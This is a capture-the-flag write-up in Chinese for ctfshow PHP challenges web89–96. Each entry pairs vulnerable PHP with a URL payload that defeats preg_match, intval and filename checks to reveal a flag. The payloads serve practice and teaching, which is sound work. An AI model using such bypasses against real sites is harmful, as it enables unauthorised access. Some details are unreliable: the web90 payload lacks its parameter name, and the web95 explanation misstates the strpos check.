# ctfshow-php语言特性(web89-150)(废弃)
[toc]

## web89 preg\_match数组绕过
```php
 <?php
include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
} 
```
```php
payload-> url/?num[]=  //报错绕过
```


## web90 十六进制绕过
```php
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```
```Plain Text
payload -> url/?0x117c
1.默认上传参数即为字符串，所以不能直接传
2.intval会自动转化进制，因此用16进制绕过
```
**拓展**

PHP intval函数

```Plain Text
intval(mixed $value, int $base = 10): int
通过使用指定的进制 base 转换（默认是十进制）

如果 base 是 0，通过检测 value 的格式来决定使用的进制：
    如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
    如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
    将使用 10 进制 (decimal)。
```


## web91 %0a
```php
<?php
show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
} 
```
```Plain Text
在正则表达式中/m表示多行匹配，/i表示忽略大小写（即大小写均拦截）
由此可知payload需通过多行匹配但不通过单行，因此插入换行符即可
payload -> url/?cmd=abc%0aphp
```


## web92 preg\_match碰字母停
```php
 <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```
```php
intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 
所以传入e通过前者("a123"=0,所以无法通过,但科学计数法e可以)
payload -> url/?num=4476e1
```


## web93 八进制绕过
```php
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```
```php
过滤了字母，不能整十六进制，那就用0开头的八进制
payload -> url/?num=010574
```


## web94 intval double自动转int 
```php
 <?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
} 
```
```Plain Text
首位不能为0，不能用八进制绕过，那就用double数字，可以绕过第一步绝对等于
payload -> url/?num=4476.0
```


## web95 intval + 
```Plain Text
增加了
if(!strpos($num, "0")){
        die("no no no!!!");
}

因此第一位得为0，考虑在头上加+
payload -> url/?num=+010574
```


## web96 ./当前目录
```php
if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    } 
```
```Plain Text
payload -> url/?u=./flag.php
```


